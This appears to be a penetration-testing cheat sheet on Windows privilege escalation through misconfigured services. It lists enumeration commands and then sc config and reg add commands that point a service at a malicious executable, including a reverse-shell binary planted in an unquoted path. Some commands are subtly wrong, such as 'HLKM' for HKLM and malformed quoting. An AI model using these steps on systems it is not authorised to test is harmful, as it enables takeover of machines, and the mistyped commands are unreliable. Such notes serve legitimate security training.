---
description: Service Exploits
---

# Service Exploits

If we have permissions to change the configuration of a service which runs in the context of SYSTEM we can change the executable with a malicious one.

**Note:** We should have stop/start permissions, otherwise we would need to restart the machine.

### First steps

Run winPEAS to check services info:

```
.\winPEAS.exe quit servicesinfo
```

Use "accesschk.exe" to view our permissions on a service:

```
.\accesschk.exe /accepteula -uwcqv $user $service
```

Query the configuration of that service:

```bash
sc qc $service
#SERVICE_START_NAME : LocalSystem = SYSTEM
```

Query the current state of the service (stopped/running):

```
sc query $service
```

### Insecure service properties

We can change the default binpath of the service and the restart that service:

```
sc config $service binpath= "\"C:\XXXX\xxx.exe""
```

### Unquoted service paths

Fist check if we find any unquoted service path and we have permissions to restart it.

```
.\accesschk.exe /accepteula -ucqv $user $service
```

Now check for writable permissions on the paths:

```
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq C:\Program Files\
.
.
```

In the above example if we have write permissions under the "C:" directory we can create a malicious file called Program.exe which establishes a reverse shell.

Now we only need to start the service again:

```
net start $service
```

### Weak Registry Permissions

Windows registry stores entries for each service. If ACLs are misconfigured we can change services configuration.

First check the permissions with PS or accesschk:

{% code overflow="wrap" %}
```powershell
powershell -exec bypass
Get-Acl HKLM:\System\CurrentControlSet\Services\$service | Format-List

.\accesschk.exe /accepteula -uvwqk HLKM\System\CurrentControlSet\Services\$service

#NT AUTHORITY\INTERACTIVE is a group with users that can log on to the machine locally.
```
{% endcode %}

Check if we can restart the service:

```
.\accesschk.exe /accepteula -ucqv $user $service
```

Check the current values in the service registry entry:

```
reg query HLKM\System\CurrentControlSet\Services\$service
```

Change the executable of the service:

{% code overflow="wrap" %}
```powershell
reg add HLKM\System\CurrentControlSet\Services\$service /v ImagePath /t REG_EXPAND_SZ /d C:\malicious.exe
```
{% endcode %}

Restart the service.

### Insecure Service Executables

If we can change the original executable we can replace it directly.

Verify if we can modify the executable:

```
.\accesschk.exe /accepteula -quvw "C:\XX\XX.exe"
```

Check if we can restart the service and then replace it.

### DLL Hijacking

Analyze the executable and find which dlls the program is trying to use. If we have writable permissions on that DLL we can replace it.

Another example is when a DLL is missions from the system and we have writable access to a directory within the PATH that Windows searches for DLLs.
